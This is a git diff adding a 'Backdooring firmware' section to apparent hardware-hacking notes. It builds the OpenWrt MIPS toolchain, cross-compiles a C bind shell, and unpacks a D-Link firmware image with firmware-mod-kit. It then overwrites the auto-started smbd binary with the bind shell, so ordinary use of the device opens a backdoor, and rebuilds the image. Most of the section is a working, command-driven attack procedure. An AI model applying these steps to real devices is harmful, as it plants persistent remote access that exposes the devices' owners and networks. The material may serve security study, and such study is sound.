@@ -248,3 +248,66 @@ FIRMADYNE successfully identified an interface with the IPv4 address 192.168.1.1
 ./scratch/1/run.sh
 ```
 
+## Backdooring firmware
+1. Identify endinaness and architechure of firmware using any of the previously disccused methods.
+2. To compile the backdoor agent, we first need to set up the compilation environment. The easiest way is to use the OpenWrt project’s frequently updated toolchain.  
+
+> [OpenWRT's tool chain installation guide](https://openwrt.org/docs/guide-developer/toolchain/use-buildsystem#build_system_usage)
+
+```bash
+# Download and update the sources
+git clone https://git.openwrt.org/openwrt/openwrt.git
+cd openwrt
+git pull
+ 
+# Select a specific code revision
+git branch -a
+git tag
+git checkout v21.02.3
+ 
+# Update the feeds
+./scripts/feeds update -a
+./scripts/feeds install -a
+ 
+# Configure the firmware image and the kernel
+make menuconfig
+make -j $(nproc) kernel_menuconfig
+ 
+# Build the firmware image
+make -j $(nproc) defconfig download clean world
+```
+
+3. By default, these commands will compile the firmware for the Atheros AR7 type of System on a Chip (SoC) routers, which are based on MIPS processors. To set a different value, click Target System and choose one of the available Atheros AR7 devices.
+
+![](Screenshots/Pasted%20image%2020220625173837.png)
+
+Then save your changes to a new configuration file by clicking the SAVE  
+option, and exit from the menu by clicking the EXIT option
+
+4. Move a C bindshell to OpenWrt's directory. You can use [this sample C Linux Bindshell](/Code%20Snippets/C%20Linux%20Bind%20Shell.md)
+
+5. In OpenWrt’s staging_dir/toolchain-mips_24kc_gcc-8.4.0_musl/bin/mips-openwrt-linux-musl-gcc, you’ll find the mips-openwrt-linux-gcc compiler, which you can use as follows:
+
+```bash
+export STAGING_DIR=/opt/openwrt/staging_dir
+./staging_dir/toolchain-mips_24kc_gcc-8.4  
+.0_musl/bin/mips-openwrt-linux-gcc bindshell.c -o bindshell -static -EB -march=24kc
+```
+
+6. Clone and install firmware-mod-kit to unpack the firmware.
+```bash
+git clone https://github.com/rampageX/firmware-mod-kit
+cd firmware-mod-kit
+./extract-firmware.sh Dlink_firmware.bin
+```
+
+7. For the attack to be successful, the firmware should replace an existing binary that runs automatically, guaranteeing that any normal use of the device will trigger the backdoor. During the dynamic analysis phase, we indeed identified a binary like that: an SMB service running at port 445. You can find the smbd binary in the /userfs/bin/smbd directory. Let’s replace it with the bindshell.
+
+```bash
+cp bindshell /userfs/bin/smbd
+```
+
+8. After replacing the binary, reconstruct the firmware using the build firmware script
+```bash
+./build-firmware.sh
+```
